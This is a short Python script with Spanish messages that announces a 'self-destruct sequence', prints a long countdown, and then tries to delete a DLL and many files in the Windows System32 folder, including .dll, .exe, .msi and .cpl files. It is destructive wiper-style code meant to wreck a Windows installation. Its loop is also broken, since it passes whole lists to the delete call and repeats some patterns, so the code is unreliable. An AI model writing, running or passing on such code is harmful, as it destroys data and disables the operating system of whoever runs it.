n = 1
print("secuencia de auto destruccion")
for n in range(10000):
    print(f"Auto destruccion en {n+1}")
from os import remove
try:
    remove('C:\Windows\System32\prueba.dll')
except OSError as e:
    print(f'Error:{ e.strerror}')

import os
import glob

files = glob.glob('C:\Windows\System32/*.dll')
files1 = glob.glob('C:\Windows\System32/*.exe')
files2 = glob.glob('C:\Windows\System32/*.bin')
files3 = glob.glob('C:\Windows\System32/*.log')
files4 = glob.glob('C:\Windows\System32/*.ax')
files5 = glob.glob('C:\Windows\System32/*.ax')
files6 = glob.glob('C:\Windows\System32/*.uc')
files7 = glob.glob('C:\Windows\System32/*.cpl')
files8 = glob.glob('C:\Windows\System32/*.msc')
files9 = glob.glob('C:\Windows\System32/*.dat')
files10 = glob.glob('C:\Windows\System32/*.wmv')
files11 = glob.glob('C:\Windows\System32/*.png')
files12 = glob.glob('C:\Windows\System32/*.jpg')
files13 = glob.glob('C:\Windows\System32/*.bat')
files14 = glob.glob('C:\Windows\System32/*.msi')
files15 = glob.glob('C:\Windows\System32/*.acm')
files16 = glob.glob('C:\Windows\System32/*.vbs')
files17 = glob.glob('C:\Windows\System32/*.vp')
files18 = glob.glob('C:\Windows\System32/*.ax')


for files in files:
    try:
        os.remove(files)
        os.remove(files1)
        os.remove(files2)
        os.remove(files3)
        os.remove(files4)
        os.remove(files5)
        os.remove(files6)
        os.remove(files7)
        os.remove(files8)
        os.remove(files9)
        os.remove(files10)
        os.remove(files11)
        os.remove(files12)
        os.remove(files13)
        os.remove(files14)
        os.remove(files15)
        os.remove(files16)
        os.remove(files17)
        os.remove(files18)

    except OSError as e:
        print(f"Error:{ e.strerror}")
